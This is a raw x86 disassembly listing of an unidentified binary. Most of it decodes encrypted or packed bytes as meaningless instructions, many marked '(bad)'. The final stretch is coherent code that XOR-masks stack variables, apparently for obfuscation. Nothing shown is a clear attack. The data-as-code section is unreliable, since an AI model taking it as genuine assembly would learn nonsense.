  417c59:	aad    0xd9
  417c5b:	mov    eax,0x8acc5fdb
  417c60:	and    edx,ebp
  417c62:	mov    ds:0xfd4c4e91,al
  417c67:	test   DWORD PTR [edi+0x52],eax
  417c6a:	or     esi,ebx
  417c6c:	xchg   DWORD PTR [eax+0x3b549394],edi
  417c72:	cmp    eax,DWORD PTR [ebx-0x7cb300d6]
  417c78:	xor    BYTE PTR [edx+0x7fbc1dca],dl
  417c7e:	pop    ss
  417c7f:	push   ss
  417c80:	loop   0x417c82
  417c82:	rcr    BYTE PTR [ecx-0x3ac94c25],0x42
  417c89:	mov    dl,0x35
  417c8b:	xchg   ebx,eax
  417c8c:	mov    ch,0x4c
  417c8e:	fldenv [ebx]
  417c90:	enter  0x5c9b,0x95
  417c94:	ret    0x8280
  417c97:	adc    dl,ah
  417c99:	inc    edi
  417c9a:	pop    ebp
  417c9b:	sahf   
  417c9c:	les    ebp,FWORD PTR [ecx+ebx*8-0x21]
  417ca0:	adc    BYTE PTR [eax],bl
  417ca2:	jmp    0x99ee:0xc20df4ac
  417ca9:	into   
  417caa:	xchg   ebx,eax
  417cab:	push   es
  417cac:	mov    ecx,0x9d35e82d
  417cb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cb2:	test   al,0xd6
  417cb4:	es stos DWORD PTR es:[edi],eax
  417cb6:	lock push edi
  417cb8:	lods   eax,DWORD PTR ds:[esi]
  417cb9:	loopne 0x417c7a
  417cbb:	inc    edx
  417cbc:	adc    al,0xc2
  417cbe:	mov    ebx,0x39eb8ad1
  417cc3:	xor    DWORD PTR [ebp+ebx*1-0x292e9144],eax
  417cca:	hlt    
  417ccb:	add    eax,0x97615351
  417cd0:	(bad)  
  417cd1:	jno    0x417c61
  417cd3:	xor    BYTE PTR [ebx],bh
  417cd5:	xchg   edx,eax
  417cd6:	mov    BYTE PTR [edi+ebx*4+0x4f26705],dh
  417cdd:	rcl    edi,0xf2
  417ce0:	jecxz  0x417c74
  417ce2:	pop    ecx
  417ce3:	xchg   DWORD PTR [eax-0x55],edi
  417ce6:	cli    
  417ce7:	popf   
  417ce8:	mov    bh,0x47
  417cea:	push   edi
  417ceb:	data16 sub al,0x85
  417cee:	sbb    DWORD PTR [edi+0x282b253f],ebx
  417cf4:	mov    ds:0x7556066a,eax
  417cf9:	cwde   
  417cfa:	xor    esi,DWORD PTR [edx]
  417cfc:	out    0x1d,al
  417cfe:	fld    DWORD PTR [ebp+eiz*1+0x15927edb]
  417d05:	push   ds
  417d06:	add    eax,0xccba9f37
  417d0b:	sbb    esp,DWORD PTR [edi+0x533e8846]
  417d11:	or     al,0xb2
  417d13:	call   0x50478d5
  417d18:	shl    dh,cl
  417d1a:	xlat   BYTE PTR ds:[ebx]
  417d1b:	test   DWORD PTR [esi],ebp
  417d1d:	ins    DWORD PTR es:[edi],dx
  417d1e:	adc    DWORD PTR [eax-0x5a],esi
  417d21:	hlt    
  417d22:	xchg   esi,eax
  417d23:	push   ds
  417d24:	icebp  
  417d25:	dec    eax
  417d26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d27:	sub    al,0x7b
  417d29:	fst    st(4)
  417d2b:	hlt    
  417d2c:	sub    DWORD PTR [ebx+0x6ac34137],edx
  417d32:	test   eax,0xc1743e7f
  417d37:	xchg   esi,eax
  417d38:	pop    edx
  417d39:	clc    
  417d3a:	fdivr  DWORD PTR [edi+0x62]
  417d3d:	sub    BYTE PTR [ecx+0x1],cl
  417d40:	adc    al,BYTE PTR [ebx]
  417d42:	mov    edx,0xa5a657ba
  417d47:	inc    ecx
  417d48:	jge    0x417db8
  417d4a:	test   DWORD PTR [edx+0x17a25fb8],ebx
  417d50:	das    
  417d51:	push   esi
  417d52:	fucom  st(7)
  417d54:	(bad)  
  417d55:	call   0x845291cb
  417d5a:	xchg   esi,eax
  417d5b:	or     DWORD PTR [edx+0x6c9705e3],ebp
  417d61:	or     al,0x2c
  417d63:	aaa    
  417d64:	pop    ss
  417d65:	cmp    BYTE PTR [edx],0x0
  417d68:	scas   eax,DWORD PTR es:[edi]
  417d69:	mov    bl,0x5c
  417d6b:	jb     0x417cfc
  417d6d:	gs push es
  417d6f:	rol    BYTE PTR ds:0xf9ac715c,cl
  417d75:	int3   
  417d76:	dec    eax
  417d77:	scas   al,BYTE PTR es:[edi]
  417d78:	sbb    ebx,DWORD PTR [ebx-0x3e403ca3]
  417d7e:	cwde   
  417d7f:	pop    ds
  417d80:	mov    edx,0xf86dc19f
  417d85:	stos   DWORD PTR es:[edi],eax
  417d86:	ss cwde 
  417d88:	test   bh,dh
  417d8a:	add    dl,BYTE PTR [esi-0xd]
  417d8d:	pop    ebx
  417d8e:	pop    edx
  417d8f:	lods   al,BYTE PTR ds:[esi]
  417d90:	add    DWORD PTR [eax+esi*2],ebx
  417d93:	dec    esi
  417d94:	fs mov ebx,0x48e399df
  417d9a:	(bad)  [edx+0x2bae52be]
  417da0:	jmp    0x417e1c
  417da2:	jmp    0x56875fc7
  417da7:	xlat   BYTE PTR ds:[ebx]
  417da8:	jnp    0x417d96
  417daa:	es mov esp,0xfe0d05f2
  417db0:	nop
  417db1:	push   es
  417db2:	or     ah,BYTE PTR [eax+0x29bb2bad]
  417db8:	dec    eax
  417db9:	stc    
  417dba:	cld    
  417dbb:	sub    bh,BYTE PTR [ebx]
  417dbd:	mov    al,ds:0x3e54de7e
  417dc2:	add    eax,0x21cac247
  417dc7:	aad    0x23
  417dc9:	aaa    
  417dca:	adc    DWORD PTR [edi+0x5c616fa8],ebp
  417dd0:	es push esp
  417dd2:	int3   
  417dd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dd4:	repnz idiv edi
  417dd7:	je     0x417dcd
  417dd9:	add    BYTE PTR [edx-0x311877d1],dl
  417ddf:	shl    DWORD PTR [eax],1
  417de1:	mov    esp,0xd166d35e
  417de6:	xchg   ebp,eax
  417de7:	xlat   BYTE PTR ds:[ebx]
  417de8:	ror    DWORD PTR [eax],0x84
  417deb:	inc    edx
  417dec:	jle    0x417dc8
  417dee:	cmp    dh,BYTE PTR [eax+0x62]
  417df1:	iret   
  417df2:	dec    edi
  417df3:	inc    esp
  417df4:	ss loope 0x417e02
  417df7:	push   esp
  417df8:	mov    ebx,0xc0d313cb
  417dfd:	pop    eax
  417dfe:	adc    DWORD PTR [edi-0x3e437c23],0x55
  417e05:	and    bh,al
  417e07:	sbb    eax,0x3d1a6680
  417e0c:	pop    ecx
  417e0d:	jns    0x417e86
  417e0f:	sbb    ch,bl
  417e11:	add    esi,edi
  417e13:	push   esp
  417e14:	pop    edx
  417e15:	and    eax,0xd7a798eb
  417e1a:	cmp    BYTE PTR [ebp+0x54],dh
  417e1d:	pushf  
  417e1e:	adc    BYTE PTR [edx],cl
  417e20:	loopne 0x417e8e
  417e22:	jae    0x417daf
  417e24:	dec    esp
  417e25:	push   edi
  417e26:	not    DWORD PTR [ecx+0x2a]
  417e29:	add    ecx,DWORD PTR [eax+esi*1]
  417e2c:	js     0x417df8
  417e2e:	loop   0x417dfb
  417e30:	mov    ebx,0x264ad51
  417e35:	sbb    eax,0x1f56282d
  417e3a:	push   ecx
  417e3b:	mov    eax,ds:0xcda0e6b
  417e40:	xchg   eax,ebp
  417e42:	jecxz  0x417dcc
  417e44:	push   ebx
  417e45:	stos   DWORD PTR es:[edi],eax
  417e46:	push   ecx
  417e47:	dec    ecx
  417e48:	push   ds
  417e49:	enter  0xa4be,0x64
  417e4d:	and    BYTE PTR [eax+0xf],ah
  417e50:	repz sub DWORD PTR [edi+0x39653e82],edi
  417e57:	fisub  WORD PTR [edi+eax*4]
  417e5a:	popf   
  417e5b:	(bad)  
  417e5c:	stc    
  417e5d:	push   es
  417e5e:	adc    eax,0x176cfb89
  417e63:	lock xchg ebx,eax
  417e65:	clc    
  417e66:	pop    esi
  417e67:	and    dl,BYTE PTR [ebx-0x59484b68]
  417e6d:	dec    ebx
  417e6e:	out    0x56,al
  417e70:	xor    ecx,0xfffffffb
  417e73:	sbb    eax,DWORD PTR [eax-0x2d309d94]
  417e79:	xchg   edx,eax
  417e7a:	lock fldcw WORD PTR ds:0x90d93b2f
  417e81:	ret    0x8762
  417e84:	mov    ebx,DWORD PTR es:[ebx-0x37]
  417e88:	pop    ecx
  417e89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e8a:	(bad)
  417e8d:	(bad)  
  417e8e:	xchg   ecx,eax
  417e8f:	cli    
  417e90:	push   eax
  417e91:	and    BYTE PTR [esp+ebp*4+0x1e],0xf3
  417e96:	xchg   edx,eax
  417e97:	popf   
  417e98:	jnp    0x417ed0
  417e9a:	je     0x417eaf
  417e9c:	adc    ax,0x278c
  417ea0:	xor    DWORD PTR [ebp+0x41],ebx
  417ea3:	(bad)  
  417ea4:	cld    
  417ea5:	xor    eax,esp
  417ea7:	jo     0x417ec4
  417ea9:	pop    esi
  417eaa:	jns    0x417e57
  417eac:	stos   BYTE PTR es:[edi],al
  417ead:	add    DWORD PTR [esi-0x7a61284b],ebx
  417eb3:	push   0x8
  417eb5:	(bad)  
  417eb6:	mov    edx,DWORD PTR [ebx+ebp*1+0x79]
  417eba:	cmc    
  417ebb:	repnz (bad) [ebp-0x560d6277]
  417ec2:	adc    eax,0x734da5a4
  417ec7:	add    al,0x83
  417ec9:	cmc    
  417eca:	mov    dh,0x51
  417ecc:	mov    eax,0xd808db59
  417ed1:	mov    esp,0x38de5ac3
  417ed6:	lods   eax,DWORD PTR ds:[esi]
  417ed7:	or     al,0x1d
  417ed9:	fnsave [ecx+edi*8+0x9f06b51]
  417ee0:	push   0x8634ca24
  417ee5:	sbb    ch,BYTE PTR [esi+0xe1cd7ba]
  417eeb:	mov    ebp,DWORD PTR [edi+0x27]
  417eee:	push   0x3530f7a9
  417ef3:	pop    ebp
  417ef4:	dec    ebp
  417ef5:	lock cmp DWORD PTR [ebp-0x72],eax
  417ef9:	xor    eax,0xcc0e4e13
  417efe:	mov    al,0x9f
  417f00:	repnz rcl DWORD PTR [eax+edx*4+0x7a8fb7ea],1
  417f08:	inc    ebx
  417f09:	push   edi
  417f0a:	push   ecx
  417f0b:	mov    edi,0xae4dfd8d
  417f10:	xchg   edi,eax
  417f11:	pop    esi
  417f12:	mov    bh,0x1
  417f14:	into   
  417f15:	cmp    al,0xbd
  417f17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f18:	or     esi,DWORD PTR [ebx*8+0x292d59ff]
  417f1f:	rcr    BYTE PTR [edi+0x6],1
  417f22:	mov    eax,ds:0x296c8889
  417f27:	mov    al,ds:0xf9343e9
  417f2c:	pop    ss
  417f2d:	shr    eax,0x24
  417f30:	pop    ebp
  417f31:	stos   DWORD PTR es:[edi],eax
  417f32:	mov    bl,0xab
  417f34:	(bad)  
  417f35:	or     eax,0x3ae07b65
  417f3a:	lods   eax,DWORD PTR ds:[esi]
  417f3b:	fst    st(1)
  417f3d:	sbb    al,0x2
  417f3f:	push   edx
  417f40:	mov    bh,0x58
  417f42:	int    0x3e
  417f44:	mov    ds:0xfc90fd25,al
  417f49:	pop    ebp
  417f4a:	and    DWORD PTR ds:0x3b1a456,0xffffffeb
  417f51:	push   eax
  417f52:	push   esp
  417f53:	outs   dx,BYTE PTR ds:[esi]
  417f54:	ins    BYTE PTR es:[edi],dx
  417f55:	in     eax,0x13
  417f57:	mov    BYTE PTR [eax],al
  417f59:	jnp    0x417ede
  417f5b:	jp     0x417f45
  417f5d:	add    al,0x73
  417f5f:	push   0xc003d5ea
  417f64:	adc    esp,esp
  417f66:	clc    
  417f67:	xor    BYTE PTR [esi+0x6fc01614],dl
  417f6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f6e:	add    esi,DWORD PTR [esi+ebx*4+0x42]
  417f72:	ret    0x5cf8
  417f75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f76:	call   0x3ecd:0x93db5c7c
  417f7d:	xchg   BYTE PTR [ebx],cl
  417f7f:	aad    0x6d
  417f81:	pop    ds
  417f82:	int    0xfb
  417f84:	and    BYTE PTR [esi],0x2d
  417f87:	jl     0x418008
  417f89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f8a:	mov    dl,0x7a
  417f8c:	out    0xa8,al
  417f8e:	iret   
  417f8f:	out    dx,eax
  417f90:	jmp    0x417fda
  417f92:	jbe    0x417f3c
  417f94:	in     al,dx
  417f95:	in     al,0x4a
  417f97:	xchg   ebx,eax
  417f98:	aas    
  417f99:	shl    BYTE PTR [ebp+0x7992421d],cl
  417f9f:	lds    esp,FWORD PTR [ebx]
  417fa1:	sbb    eax,0x48435c7c
  417fa6:	xchg   ebx,eax
  417fa7:	jbe    0x417f67
  417fa9:	push   eax
  417faa:	aaa    
  417fab:	stc    
  417fac:	pop    ebp
  417fad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fae:	mov    esp,gs
  417fb0:	in     eax,0xd1
  417fb2:	fxtract 
  417fb4:	mov    edi,0xe0d412c1
  417fb9:	jp     0x417fc2
  417fbb:	repz add al,al
  417fbe:	pop    ebx
  417fbf:	cmp    al,0x8a
  417fc1:	ds fdiv st(7),st
  417fc4:	pop    esp
  417fc5:	lea    eax,[ebx]
  417fc7:	aas    
  417fc8:	mov    ds:0x3d5f0418,eax
  417fcd:	mov    WORD PTR [edx+0x61],ds
  417fd0:	data16 and al,0x77
  417fd3:	mov    ch,0x73
  417fd5:	xor    esi,ebp
  417fd7:	mov    WORD PTR [ecx],ss
  417fd9:	mov    ch,0xcb
  417fdb:	punpckhwd mm3,QWORD PTR [edi]
  417fde:	dec    eax
  417fdf:	call   0x1348:0xf6825706
  417fe6:	out    0x19,al
  417fe8:	and    dl,ah
  417fea:	xchg   ah,bh
  417fec:	outs   dx,DWORD PTR ds:[esi]
  417fed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fee:	push   ebp
  417fef:	inc    ecx
  417ff0:	das    
  417ff1:	and    eax,0xaba1c125
  417ff6:	not    DWORD PTR ds:0xf176c4f1
  417ffc:	sub    BYTE PTR [ebp+0x7fdf2323],bl
  418002:	pop    ebp
  418003:	fwait
  418004:	push   esp
  418005:	(bad)  
  418006:	in     al,0xeb
  418008:	les    ecx,FWORD PTR [eax-0x56d02e1a]
  41800e:	xlat   BYTE PTR ds:[ebx]
  41800f:	mov    ebp,0x5021297
  418014:	fist   DWORD PTR [eax-0x9]
  418017:	adc    ecx,DWORD PTR [eax-0x6eeb7788]
  41801d:	not    BYTE PTR [edx+0x4216b459]
  418023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418024:	or     ah,ch
  418026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418027:	push   edx
  418028:	jecxz  0x418020
  41802a:	cld    
  41802b:	mov    edi,0x7e5e3f4f
  418030:	cmp    DWORD PTR [eax-0x76],esp
  418033:	mov    esp,?
  418035:	add    eax,0xfbab9a28
  41803a:	push   0x30124db
  41803f:	or     DWORD PTR [eax],0x10
  418042:	popa   
  418043:	scas   eax,DWORD PTR es:[edi]
  418044:	inc    eax
  418045:	sub    DWORD PTR [eax-0x5eaa1cef],eax
  41804b:	shl    BYTE PTR [edx-0xd],1
  41804e:	lds    ebp,FWORD PTR [eax+ecx*8+0x7c091418]
  418055:	sbb    al,0x9f
  418057:	out    0x5,al
  418059:	das    
  41805a:	mov    ecx,0x7acb227b
  41805f:	das    
  418060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418061:	ins    DWORD PTR es:[edi],dx
  418062:	nop
  418063:	fwait
  418064:	imul   ebp,DWORD PTR [eax+0x5d19c70b],0x24
  41806b:	adc    DWORD PTR [edi+0x69df02a5],esi
  418071:	jecxz  0x4180ba
  418073:	cs add al,0x2d
  418076:	cdq    
  418077:	jmp    0x50979955
  41807c:	daa    
  41807d:	cs test eax,0x5febae3
  418083:	outs   dx,DWORD PTR ds:[esi]
  418084:	inc    ebx
  418085:	push   ebx
  418086:	xor    esi,esp
  418088:	aam    0x9c
  41808a:	test   DWORD PTR [ebx],0x771c82b3
  418090:	imul   edx,DWORD PTR [ebx+eax*1+0x47],0xeafa79a4
  418098:	jge    0x4180cd
  41809a:	and    eax,DWORD PTR [ebp+0x5a]
  41809d:	mov    bh,0x9b
  41809f:	aas    
  4180a0:	inc    esi
  4180a1:	fild   QWORD PTR [ebx+eiz*1-0x6]
  4180a5:	pusha  
  4180a6:	imul   edi,ebx,0xffffffdb
  4180a9:	aas    
  4180aa:	and    al,BYTE PTR [edi-0x35]
  4180ad:	arpl   WORD PTR [esi],ax
  4180af:	aam    0x93
  4180b1:	leave  
  4180b2:	in     al,0x2d
  4180b4:	fwait
  4180b5:	inc    edi
  4180b6:	lods   al,BYTE PTR ds:[esi]
  4180b7:	push   eax
  4180b8:	sti    
  4180b9:	stos   DWORD PTR es:[edi],eax
  4180ba:	mov    esi,0xbb0c1c45
  4180bf:	repz or ch,BYTE PTR [ecx+0x2bcb0209]
  4180c6:	outs   dx,BYTE PTR ds:[esi]
  4180c7:	pop    ss
  4180c8:	addr16 pop eax
  4180ca:	or     eax,0x84333a66
  4180cf:	dec    edi
  4180d0:	cmp    al,0xee
  4180d2:	inc    edx
  4180d3:	sbb    eax,0x4428c89b
  4180d8:	scas   eax,DWORD PTR es:[edi]
  4180d9:	xor    BYTE PTR [edx-0x18],ch
  4180dc:	dec    eax
  4180dd:	dec    esp
  4180de:	mov    edi,0x2effded2
  4180e3:	pop    edx
  4180e5:	lods   al,BYTE PTR ds:[esi]
  4180e6:	outs   dx,DWORD PTR ds:[esi]
  4180e7:	xchg   ebx,eax
  4180e8:	cmp    BYTE PTR [ecx+0x17],bh
  4180eb:	mov    edi,0xc68471f6
  4180f0:	push   edi
  4180f1:	push   ecx
  4180f2:	xchg   ebx,eax
  4180f3:	cwde   
  4180f4:	push   ebp
  4180f5:	mov    esp,0x1d918498
  4180fa:	mov    esi,0xb0e3ae9a
  4180ff:	ss scas al,BYTE PTR es:[edi]
  418101:	mov    BYTE PTR [edx+0x78a8a426],0x5b
  418108:	test   DWORD PTR [edx+0x11],eax
  41810b:	add    ecx,DWORD PTR [ebx]
  41810d:	out    0x94,eax
  41810f:	fild   DWORD PTR [ecx+0x1b]
  418112:	lods   eax,DWORD PTR ds:[esi]
  418113:	xor    DWORD PTR [edi],esp
  418115:	popf   
  418116:	das    
  418117:	cld    
  418118:	inc    esi
  418119:	adc    DWORD PTR [esi-0x1a],edx
  41811c:	retf   
  41811d:	fadd   QWORD PTR [ecx+edi*1+0x59]
  418121:	jge    0x41819b
  418123:	into   
  418124:	and    BYTE PTR [edx-0x78],bl
  418127:	or     BYTE PTR [ebx+ebx*1-0x2c],ah
  41812b:	sbb    esi,DWORD PTR [edx+eiz*4-0x51]
  41812f:	mov    ah,0x3a
  418131:	push   es
  418132:	xchg   edx,eax
  418133:	repnz cmp al,0x4b
  418136:	mov    ds:0xea95573,al
  41813b:	out    0x60,al
  41813d:	sbb    ebx,DWORD PTR [ebx]
  41813f:	hlt    
  418140:	mov    ebx,0x25eead21
  418145:	mov    BYTE PTR [ebp-0x44],0xda
  418149:	xchg   BYTE PTR [edi+0x4e67354b],bh
  41814f:	out    dx,eax
  418150:	call   0xfd98:0x393e99b3
  418157:	pop    ss
  418158:	fisubr WORD PTR [esi+0x17]
  41815b:	jg     0x418198
  41815d:	cmc    
  41815e:	test   eax,ebx
  418160:	pop    edi
  418161:	push   cs
  418162:	add    al,0xaf
  418164:	addr16 in eax,0x3d
  418167:	sbb    BYTE PTR [eax],0x7f
  41816a:	sahf   
  41816b:	pop    ebx
  41816c:	lds    edx,FWORD PTR [ecx+0x51]
  41816f:	sub    al,0x9
  418171:	in     eax,dx
  418172:	ins    BYTE PTR es:[di],dx
  418174:	test   eax,0xf42305f4
  418179:	mov    esp,0x63847dcf
  41817e:	(bad)  
  41817f:	pop    ss
  418180:	call   DWORD PTR [ebp+eax*8+0x51]
  418184:	push   edi
  418185:	iret   
  418186:	push   ds
  418187:	mov    dl,0x71
  418189:	std    
  41818a:	clc    
  41818b:	ss retf 0xf166
  41818f:	ds in  al,dx
  418191:	jmp    0x18d654aa
  418196:	fst    DWORD PTR [esi+0x25]
  418199:	mov    edi,0xda353b2c
  41819e:	in     eax,dx
  41819f:	aam    0x38
  4181a1:	cdq    
  4181a2:	xchg   ebp,eax
  4181a3:	mov    al,0xea
  4181a5:	jg     0x4181b6
  4181a7:	sti    
  4181a8:	test   BYTE PTR [ebx],0xa7
  4181ab:	cmp    esp,DWORD PTR [ebx+0x14]
  4181ae:	push   ebx
  4181af:	mov    ch,0xd9
  4181b1:	leave  
  4181b2:	std    
  4181b3:	cmp    edx,DWORD PTR [edi]
  4181b5:	mov    edx,ebp
  4181b7:	mov    esp,0xf58b260b
  4181bc:	lea    edi,[ebp+ebp*1-0x1cb7b638]
  4181c3:	sahf   
  4181c4:	lds    edx,FWORD PTR [ebp+0x66]
  4181c7:	dec    esi
  4181c8:	pop    ebp
  4181c9:	inc    esi
  4181ca:	call   0xbee096b5
  4181cf:	cwde   
  4181d0:	retf   0x668d
  4181d3:	inc    eax
  4181d4:	push   esp
  4181d5:	repnz add eax,0x56959a0c
  4181db:	sbb    eax,0x85536a2e
  4181e0:	fwait
  4181e1:	outs   dx,BYTE PTR ds:[esi]
  4181e2:	rol    BYTE PTR [edx+0x46],cl
  4181e5:	es jnp 0x41823f
  4181e8:	popf   
  4181e9:	gs icebp 
  4181eb:	daa    
  4181ec:	repnz imul edx,DWORD PTR [edi+edi*2],0xd
  4181f1:	sti    
  4181f2:	and    dl,dl
  4181f4:	out    0x99,al
  4181f6:	inc    edi
  4181f7:	sub    dl,BYTE PTR [edi]
  4181f9:	idiv   BYTE PTR [edx+eiz*8-0x1d]
  4181fd:	add    cl,ch
  4181ff:	std    
  418200:	mov    dh,BYTE PTR ds:0x945db996
  418206:	std    
  418207:	mov    ebp,edx
  418209:	pop    esp
  41820a:	dec    esp
  41820b:	je     0x41821e
  41820d:	jbe    0x418289
  41820f:	xchg   BYTE PTR [ebp+0xa89524a],bh
  418215:	pop    esp
  418216:	cmp    DWORD PTR [ecx],edi
  418218:	dec    ebp
  418219:	jg     0x4181bf
  41821b:	sbb    esi,eax
  41821d:	bound  esi,QWORD PTR [edx+edx*2+0x67598ce5]
  418224:	call   0x433c:0x290a6253
  41822b:	sbb    cl,ch
  41822d:	add    ebp,DWORD PTR ds:0x434dfc84
  418233:	add    DWORD PTR [ecx],ecx
  418235:	xchg   edx,eax
  418236:	adc    edx,DWORD PTR [eax+esi*4]
  418239:	call   0x3486:0xd8d1ed89
  418240:	mov    bl,0xaf
  418242:	push   es
  418243:	mov    ds:0xba9831a4,al
  418248:	fbld   TBYTE PTR [ebp+0x61]
  41824b:	shr    BYTE PTR [edx+0x6e],1
  41824e:	cli    
  41824f:	sub    bl,BYTE PTR [eax+0x32eb8be]
  418255:	and    bl,ah
  418257:	aaa    
  418258:	inc    ebx
  418259:	mov    esp,0xbeefe001
  41825e:	call   0xc18baa17
  418263:	ss call 0xd5e0:0xa174f3d0
  41826b:	aad    0x23
  41826d:	mov    cl,0x50
  41826f:	aad    0x34
  418271:	push   ds
  418272:	sub    eax,0x9cc0b9b
  418277:	push   DWORD PTR ds:0x60678da6
  41827d:	or     eax,0xf0af9f12
  418282:	dec    edi
  418283:	sub    eax,0x3d85bea6
  418288:	sbb    ah,al
  41828a:	cmp    ah,BYTE PTR [eax+0x392c3bed]
  418290:	and    eax,0xee302560
  418295:	add    eax,0xc15770a1
  41829a:	imul   ebx,DWORD PTR [eax+0x78],0xffffff85
  41829e:	jmp    0x418308
  4182a0:	test   al,0xae
  4182a2:	leave  
  4182a3:	pop    ds
  4182a4:	dec    esp
  4182a5:	push   ecx
  4182a6:	jno    0x4182ba
  4182a8:	jle    0x4182c4
  4182aa:	arpl   WORD PTR [edi-0x382cab88],bx
  4182b0:	(bad)  
  4182b1:	jl     0x418284
  4182b3:	ins    BYTE PTR es:[edi],dx
  4182b4:	cli    
  4182b5:	sbb    DWORD PTR [ebx+eiz*1-0x61aa433b],edx
  4182bc:	mov    edx,0x29efd29
  4182c1:	push   eax
  4182c2:	sbb    BYTE PTR [esi+eiz*8+0x46],cl
  4182c6:	mov    edi,0xe4f0916b
  4182cb:	retf   
  4182cc:	push   ebp
  4182cd:	sub    edx,ebx
  4182cf:	add    edi,DWORD PTR [esi+0x817d946]
  4182d5:	pop    edi
  4182d6:	pop    edi
  4182d7:	dec    esi
  4182d8:	or     ebp,DWORD PTR [esi-0x1fbce4cf]
  4182de:	popf   
  4182df:	leave  
  4182e0:	test   eax,ecx
  4182e2:	dec    esi
  4182e3:	and    eax,0xee2324e2
  4182e8:	jle    0x41834e
  4182ea:	icebp  
  4182eb:	mov    ch,dh
  4182ed:	adc    ebp,eax
  4182ef:	dec    ecx
  4182f0:	imul   esp,ecx,0xe483fd8e
  4182f6:	cmp    BYTE PTR [esi-0x25fa62d5],0xae
  4182fd:	dec    edx
  4182fe:	stos   DWORD PTR es:[edi],eax
  4182ff:	push   edi
  418300:	div    cl
  418302:	aad    0x54
  418304:	xor    DWORD PTR [eax-0x52],esi
  418307:	mov    dh,BYTE PTR [eax+0x15]
  41830a:	das    
  41830b:	(bad)  [edi]
  41830d:	add    BYTE PTR [ecx+0xa],bl
  418310:	dec    edi
  418311:	test   al,0x31
  418313:	test   DWORD PTR [edi],0x7e8c902a
  418319:	xchg   BYTE PTR es:[ecx+ecx*4+0x48],dh
  41831e:	and    DWORD PTR [ebp-0x279f1732],esi
  418324:	jmp    0xc7fb:0x27203a13
  41832b:	inc    esi
  41832c:	lods   eax,DWORD PTR ds:[esi]
  41832d:	and    esi,edi
  41832f:	jno    0x418323
  418331:	mov    eax,ds:0xfb215b6
  418336:	add    bl,bl
  418338:	and    DWORD PTR [eax+0x42de4fe4],esp
  41833e:	inc    eax
  41833f:	jg     0x4182f3
  418341:	int3   
  418342:	mov    edx,0xa88cef6f
  418347:	xchg   edx,eax
  418348:	and    dh,al
  41834a:	pop    ds
  41834b:	or     DWORD PTR [edx+0x74],edi
  41834e:	push   DWORD PTR [ecx+0x7b5baf7e]
  418354:	pop    ecx
  418355:	adc    bh,cl
  418357:	jge    0x418350
  418359:	cli    
  41835a:	(bad)  
  41835b:	mov    ah,0xe6
  41835d:	scas   al,BYTE PTR es:[edi]
  41835e:	xchg   BYTE PTR [edx],ah
  418360:	push   edi
  418361:	je     0x418362
  418363:	int3   
  418364:	out    dx,al
  418365:	and    BYTE PTR [ebp+0x79],ch
  418368:	jo     0x4183e2
  41836a:	mov    ?,WORD PTR [ecx]
  41836c:	(bad)  
  41836d:	je     0x4183d7
  41836f:	add    ch,0xdb
  418372:	dec    edx
  418373:	mov    ecx,DWORD PTR [ecx+ebp*1]
  418376:	ds add al,0x6e
  418379:	repz or DWORD PTR [esi+0x4113d323],edx
  418380:	out    0xc3,eax
  418382:	lods   al,BYTE PTR ds:[esi]
  418383:	xor    bh,BYTE PTR [esi]
  418385:	pop    edx
  418386:	cs jne 0x413c7e
  41838d:	mov    edx,DWORD PTR [ebp-0xc]
  418390:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418397:	mov    bl,BYTE PTR [ebp-0x1]
  41839a:	cmp    dl,bl
  41839c:	je     0x41a7c3
  4183a2:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183a5:	mov    edx,DWORD PTR [ebp-0xc]
  4183a8:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4183af:	mov    ebx,DWORD PTR [ebp+0xc]
  4183b2:	xor    ecx,eax
  4183b4:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  4183bb:	jne    0x41cc40
  4183c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183c4:	mov    edx,DWORD PTR [ebp+0xc]
  4183c7:	xor    ecx,eax
  4183c9:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  4183d1:	mov    edx,DWORD PTR [ebp-0x18]
  4183d4:	xor    edx,eax
  4183d6:	add    edx,esi
  4183d8:	cmp    ecx,edx
  4183da:	mov    ecx,DWORD PTR [ebp-0x14]
  4183dd:	mov    DWORD PTR [ebp+0x8],ecx
  4183e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4183e3:	je     0x41cd48
  4183e9:	xor    ecx,eax
  4183eb:	add    ecx,esi
  4183ed:	mov    ecx,0x242ebe9
  4183f2:	je     0x41cb94
  4183f8:	mov    edx,DWORD PTR [ebp+0x8]
  4183fb:	mov    ebx,DWORD PTR [ebp-0x8]
  4183fe:	xor    edx,eax
  418400:	xor    ebx,eax
  418402:	sub    edx,ebx
  418404:	sub    edx,esi
  418406:	xor    edx,eax
  418408:	mov    DWORD PTR [ebp+0x8],edx
  41840b:	mov    edx,DWORD PTR [ebp+0x8]
  41840e:	mov    ebx,DWORD PTR [ebp-0x58]
  418411:	add    edx,0x5708c4
  418417:	imul   edx,ebx
  41841a:	mov    DWORD PTR [ebp-0x58],edx
  41841d:	mov    edx,DWORD PTR [ebp+0x8]
  418420:	mov    ebx,DWORD PTR [ebp-0x54]
  418423:	add    edx,0x64f8da
  418429:	or     edx,ebx
  41842b:	mov    DWORD PTR [ebp-0x54],edx
  41842e:	mov    edx,DWORD PTR [ebp+0x8]
  418431:	mov    ebx,DWORD PTR [ebp-0x50]
  418434:	add    edx,ecx
  418436:	xor    edx,ebx
  418438:	mov    DWORD PTR [ebp-0x50],edx
  41843b:	mov    edx,DWORD PTR [ebp+0x8]
  41843e:	mov    ebx,DWORD PTR [ebp-0x4c]
  418441:	add    edx,edi
  418443:	and    edx,ebx
